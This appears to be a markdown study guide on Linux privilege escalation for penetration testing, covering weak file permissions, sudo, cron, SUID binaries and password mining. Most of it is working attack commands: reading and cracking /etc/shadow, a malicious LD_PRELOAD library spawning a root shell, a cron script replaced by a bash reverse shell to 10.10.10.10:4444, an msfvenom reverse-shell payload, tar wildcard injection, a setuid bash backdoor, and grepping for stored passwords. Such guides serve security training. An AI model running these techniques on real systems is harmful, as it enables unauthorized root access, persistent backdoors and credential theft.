# 🧙 Linux Privilege Escalation - Complete Guide

> 📚 Comprehensive guide to Linux privilege escalation techniques for penetration testing and security research

---

## 📋 Table of Contents

### 🔐 File Permissions

- Readable /etc/shadow
- Writable /etc/passwd
- Sudoers File Access

### ⚡ Sudo Exploits

- Shell Escape Sequences
- Environment Variables
- SUID Environment

### ⏰ Cron Jobs

- File Permissions
- PATH Variables
- Wildcards

### 🛠️ System Services

- SSH Keys
- SUID/SGID
- MySQL Service
- NFS Exploitation

### 🔍 Password Mining

- History Files
- Config Files

---

## 🔓 Weak File Permissions

### Readable /etc/shadow

When the `/etc/shadow` file has weak read permissions, attackers can extract password hashes and attempt to crack them offline.

#### 🎯 Method 1: Hash Extraction & Cracking

**Step 1:** Check file permissions

```bash
ls -l /etc/shadow
```

**Step 2:** Extract password hashes

```bash
cat /etc/shadow
```

**Step 3:** Crack the hashes

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

#### 🎯 Method 2: Direct Password Replacement

**Step 1:** Check permissions

```bash
ls -l /etc/shadow
```

**Step 2:** Generate new password hash

```bash
mkpasswd -m sha-512 newpasswordhere
```

**Step 3:** Replace the existing hash in `/etc/shadow`

---

### Writable /etc/passwd

If `/etc/passwd` is writable, you can directly modify user entries or add new privileged accounts.

#### 🔑 Password Hash Injection

**Step 1:** Check file permissions

```bash
ls -l /etc/passwd
```

**Step 2:** Generate password hash

```bash
openssl passwd newpasswordhere
```

**Step 3:** Replace 'x' in root entry with generated hash

---

### Sudoers File Access

#### 📖 Reading Sudo Permissions

```bash
cat /etc/sudoers
```

> [!info] What to look for User privileges, NOPASSWD entries, and command restrictions that can be bypassed

> [!warning] Write Access If writable, you can grant yourself unrestricted sudo access

---

## ⚡ Sudo Exploits

### Shell Escape Sequences

#### 🌐 GTFOBins Exploitation

**Step 1:** Check sudo permissions

```bash
sudo -l
```

**Step 2:** Visit **https://gtfobins.github.io/**

**Step 3:** Search for the allowed binary

**Step 4:** Follow the sudo escalation technique

> [!success] GTFOBins Comprehensive database of Unix binaries that can be exploited for privilege escalation

---

### Environment Variables

#### 🔧 LD_PRELOAD Method

**Step 1:** Create malicious C library

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
    unsetenv("LD_PRELOAD");
    system("/bin/bash");
}
```

**Step 2:** Compile the library

```bash
gcc -fPIC -shared -nostartfiles -o file.o file.c
```

**Step 3:** Execute with LD_PRELOAD

```bash
sudo LD_PRELOAD=/home/user/file.o vim
```

---

#### 📚 LD_LIBRARY_PATH Method

**Step 1:** Check library dependencies

```bash
ldd /usr/sbin/apache2
```

**Step 2:** Create malicious library

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

**Step 3:** Execute with modified library path

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

## ⏰ Cron Jobs Exploitation

### Cron File Permissions

#### 📝 Writable Cron Script

**Step 1:** Check crontab entries

```bash
cat /etc/crontab
```

**Step 2:** Locate script and check permissions

```bash
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
```

**Step 3:** Replace with reverse shell script

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

**Step 4:** Start netcat listener

```bash
nc -nvlp 4444
```

> [!warning] Alternative Detection If `/etc/crontab` is not readable, use **pspy** to monitor processes and identify cronjobs by timing

---

### Cron PATH Variables

#### 🛤️ PATH Hijacking

**Step 1:** Analyze crontab PATH

```bash
cat /etc/crontab
```

**Step 2:** Create malicious script in user directory

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

**Step 3:** Make executable

```bash
chmod +x /home/user/overwrite.sh
```

**Step 4:** Use backdoor

```bash
/tmp/rootbash -p
```

> [!success] Persistence This creates a persistent backdoor since cronjob runs periodically

---

### Cron Wildcards

> [!warning] Vulnerability Occurs when tar command in cronjobs lacks proper argument termination ('--')

#### 📦 Tar Checkpoint Exploitation

**Step 1:** Analyze vulnerable script

```bash
cat /usr/local/bin/compress.sh
```

**Step 2:** Generate reverse shell payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

**Step 3:** Make executable

```bash
chmod +x /home/user/shell.elf
```

**Step 4:** Create checkpoint files

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

> [!info] How it works Tar interprets filenames starting with '--' as command-line arguments, allowing injection of checkpoint actions

---

## 🔑 Passwords & Keys

### SSH Keys

#### 🔐 Root Key Discovery

```bash
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@<ip>
```

> [!info] Key Locations Check `/home/*/.ssh/`, `/root/.ssh/`, and common backup locations

---

### History Files

#### 📜 Command History Mining

```bash
cat ~/.*history | less
```

Search for accidentally typed passwords in command history

> [!warning] Common Mistake Users sometimes type passwords in wrong fields or after failed login attempts

---

### Config Files

#### 📄 Plain Text Password Discovery

```bash
find /home -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

Search for configuration files containing plain text passwords

---

## 🔒 SUID/SGID Exploits

### SUID/SGID Discovery

#### 🔍 Finding SUID/SGID Binaries

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

> [!success] Second command More focused - shows only root-owned SUID files

> [!info] Next Steps Check found binaries against GTFOBins database for known exploits

---

### SUID Environment

#### 🛤️ PATH Hijacking

**Step 1:** Examine SUID binary

```bash
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env
```

**Step 2:** Look for service calls without full paths

**Step 3:** Create malicious service binary

```bash
gcc -o service /home/user/tools/suid/service.c
```

**Step 4:** Execute with modified PATH

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

> [!warning] Vulnerability Binary uses relative path 'service' instead of absolute path '/usr/sbin/service'

---

## 📚 Additional Resources

- 🌐 [GTFOBins](https://gtfobins.github.io/)
- 📖 [HackTricks](https://book.hacktricks.xyz/)
- 🔧 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- 🛡️ [PEAS - Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng)

---

## ⚠️ Legal Disclaimer

> [!danger] Ethical Use Only This guide is for educational purposes and authorized penetration testing only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

**Tags:** #pentesting #privesc #linux #security #redteam

